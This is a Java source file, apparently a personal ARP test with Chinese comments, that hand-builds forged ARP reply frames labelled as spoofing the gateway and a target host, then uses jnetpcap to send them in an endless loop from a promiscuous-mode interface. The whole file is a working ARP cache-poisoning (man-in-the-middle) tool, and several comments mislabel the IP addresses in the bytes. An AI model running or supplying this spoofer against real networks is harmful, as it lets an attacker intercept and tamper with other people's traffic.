package com.lk;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.JPacket;
import org.jnetpcap.protocol.JProtocol;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Arp;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class ArpTest {

    public static void main(String[] args) {
        String requestHexString = "ff ff ff ff ff ff"                           // 目的MAC地址，广播帧
                + "40 e2 30 df f9 ff"                                           // 源MAC地址
                + "08 06"                                                       // ARP协议号
                + "00 01"                                                       // 表示以太网
                + "08 00"                                                       // 表示IP协议
                + "06 04"                                                       // MAC地址长度为6，IP地址长度为4
                + "00 01"                                                       // 请求包
                + "40 e2 30 df f9 ff"                                           // 源MAC地址
                + "0a 02 02 08"                                                 // 源IP地址（10.2.2.8）
                + "00 00 00 00 00 00"                                           // 目的MAC地址（待响应）
                + "0a 02 02 60"                                                 // 目的IP地址（10.2.2.44）
                + "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00";      // 填充位（18位）

        // 欺骗网关
        String responseToGateway = "ec 26 ca ff 9d 36"                          // 目的MAC地址（被攻击者）
                + "40 e2 30 df f9 ff"                                           // 源MAC地址
                + "08 06"                                                       // ARP协议号
                + "00 01"                                                       // 表示以太网
                + "08 00"                                                        // 表示IP协议
                + "06 04"                                                       // MAC地址长度为6，IP地址长度为4
                + "00 02"                                                       // 应答包
                + "74 e5 43 0e 7e c1"                                           // 源MAC地址
                + "c0 a8 01 66"                                                 // 源IP地址（192.168.1.102）
                + "80 fa 5b 2c 5e f4"                                           // 目的MAC地址（被攻击者）
                + "c0 a8 01 01";                                                // 目的IP地址（192.168.1.1）

        // 欺骗目标主机
        String responseToHost = "74 e5 43 0e 7e c1"                             // 目的MAC地址（被攻击者）
                + "40 e2 30 df f9 ff"                                           // 源MAC地址
                + "08 06"                                                       // ARP协议号
                + "00 01"                                                       // 表示以太网
                + "08 00"                                                       // 表示IP协议
                + "06 04"                                                       // MAC地址长度为6，IP地址长度为4
                + "00 02"                                                       // 应答包
                + "40 e2 30 df f9 ff"                                           // 源MAC地址
                + "c0 a8 01 01"                                                 // 源IP地址（192.168.1.1）
                + "b8 97 21 5a 1a 85"                                           // 目的MAC地址（被攻击者）
                + "c0 a8 01 66";                                                // 目的IP地址（192.168.1.102）

        String responseToLocalhost = "40 e2 30 df f9 ff"                        // 目的MAC地址（被攻击者）
                + "ec 26 ca ff 9d 36"                                           // 源MAC地址
                + "08 06"                                                       // ARP协议号
                + "00 01"                                                       // 表示以太网
                + "08 00"                                                       // 表示IP协议
                + "06 04"                                                       // MAC地址长度为6，IP地址长度为4
                + "00 02"                                                       // 应答包
                + "ec 26 ca ff 9d 36"                                           // 源MAC地址
                + "c0 a8 01 01"                                                 // 源IP地址（192.168.1.1）
                + "40 e2 30 df f9 ff"                                           // 目的MAC地址（被攻击者）
                + "c0 a8 01 68";                                                // 目的IP地址（192.168.1.102）

        JPacket packet = new JMemoryPacket(JProtocol.ARP_ID, responseToGateway);
        JPacket packet2 = new JMemoryPacket(JProtocol.ARP_ID, responseToHost);
        JPacket packet3 = new JMemoryPacket(JProtocol.ARP_ID, responseToLocalhost);

        packet.scan(0);


        System.out.println(packet.toString());
        System.out.println(packet.toHexdump());

        List<PcapIf> alldevs = new ArrayList<PcapIf>(); // Will be filled with NICs
        StringBuilder errbuf = new StringBuilder(); // For any error msgs

        int r = Pcap.findAllDevs(alldevs, errbuf);
        if (r == Pcap.NOT_OK || alldevs.isEmpty()) {
            System.err.printf("Can't read list of devices, error is %s", errbuf.toString());
            return;
        }
        PcapIf device = alldevs.get(5); // We know we have atleast 1 device

        int snaplen = 64 * 1024; // Capture all packets, no trucation
        int flags = Pcap.MODE_PROMISCUOUS; // capture all packets
        int timeout = 10 * 1000; // 10 seconds in millis
        Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);

        while (true) {
            try {
                if (pcap.sendPacket(packet) != Pcap.OK) {
                    System.err.println(pcap.getErr());
                }
                Thread.sleep(2000);
                if (pcap.sendPacket(packet) != Pcap.OK) {
                    System.err.println(pcap.getErr());
                }
                if (pcap.sendPacket(packet2) != Pcap.OK) {
                    System.err.println(pcap.getErr());
                }
                if (pcap.sendPacket(packet3) != Pcap.OK) {
                    System.err.println(pcap.getErr());
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

//        for (int i = 0; i < 50; i++) {
//            if (pcap.sendPacket(packet) != Pcap.OK) {
//                System.err.println(pcap.getErr());
//            }
//        }

//        pcap.close();
    }
}

